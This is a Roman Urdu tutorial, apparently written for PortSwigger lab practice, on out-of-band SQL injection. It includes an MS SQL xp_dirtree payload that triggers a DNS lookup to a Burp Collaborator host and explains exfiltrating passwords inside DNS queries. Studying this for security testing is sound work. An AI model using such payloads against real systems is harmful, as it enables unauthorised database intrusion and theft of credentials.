### Out-of-Band (OAST) SQL Injection Kya Hai?

Jab application SQL query ko **Asynchronously** (background thread mein) execute karti hai, toh pehle wali tamaam techniques fail ho jaati hain:

* **In-Band / Union:** Direct result screen par nahi aata.
* **Error-Based:** Screen par error show nahi hota (catch ho jata hai).
* **Time-Based:** Response delay nahi hota, kyunki original request immediately process ho jaati hai aur database query background thread mein chal rahi hoti hai.

Is situation mein hum **Out-of-Band (OAST)** technique use karte hain. Isme database ko force kiya jata hai ke woh backend se humare control kiye hue external server (jaise Burp Collaborator) par ek **DNS ya HTTP network request** bheje.

---

### OAST Ka Practical Logic

Is technique ke **2 main tareeqay** hotay hain:

1. **Conditional Verification (True/False Check):**
* Hum query mein condition lagatay hain ke agar condition True ho, toh database hamaare DNS server (`xyz.burpcollaborator.net`) ko ping kare.
* Agar humare server par DNS lookup receive ho jaye $\rightarrow$ Condition **True** hai.


2. **Direct Data Exfiltration (Sab se powerful tareeqah):**
* Isme humein ek ek character loop chalane ki zaroorat nahi hoti. Hum query ke andar hi password ko DNS domain ke sath jod (concatenate) dete hain.
* Misaal ke taur par payload query:
`SELECT password FROM users` $\rightarrow$ Result: `secret123`
* Database request bheje ga:
`secret123.xyz.burpcollaborator.net`
* Humare Collaborator server par direct **`secret123`** print ho kar aa jaye ga!


---

### DNS Protocol Hi Kyun Use Hota Hai?

Bohot si secure server environments mein Outbound Web Traffic (HTTP/HTTPS) block hoti hai, lekin **DNS Queries (Port 53)** aam taur par allow hotay hain kyunki server network ko normal chalne ke liye DNS resolutions ki zaroorat hoti hai.

---


### Burp Collaborator Aur DNS Query Triggering Logic

Out-of-Band (OAST) attack ko perform karne ke liye sab se behtar tool **Burp Collaborator** hai (jo Burp Suite Professional mein aata hai).

1. **Burp Collaborator Ka Kaam:**
* Yeh aapko ek temporary unique domain name deta hai (maslan `xyz.burpcollaborator.net`).
* Yeh domain internet par active hota hai aur monitor kar raha hota hai ke kab is domain par koi DNS request aati hai.


2. **Database Par Payload Execute Karna:**
* Har database type (MS SQL, Oracle, PostgreSQL) mein external DNS lookup trigger karne ke alag functions hotay hain.
* **Microsoft SQL Server** par `xp_dirtree` (jo file system path check karne ke liye hota hai) ka use kiya jata hai.


3. **Query Logic Breakdown:**
```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--

```


* Jab MS SQL server par yeh query run hoti hai, toh database samajhta hai ke kisi network share path (`//domain/...`) par koi folder check karna hai.
* Network share tak pohanchne ke liye database OS ko bolta hai ke `0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net` ka IP address dhoond kar laye.
* System us domain ke liye ek **DNS Query** internet par bhejta hai.


4. **Confirmation:**
* Jab aap Burp Collaborator tab par ja kar **Poll now** par click karte hain, toh aapko wahan target application server ka IP aur DNS lookup log dikhta hai, jis se confirm ho jata hai ke target system vulnerable hai.



---

### PortSwigger Labs Mein OAST Setup

PortSwigger Professional version mein Collaborator builtin aata hai. Agar Community Edition use kar rahe hon, toh is ke liye custom OAST tools (jaise `interactsh` ya personal server domain) use kiye jate hain.
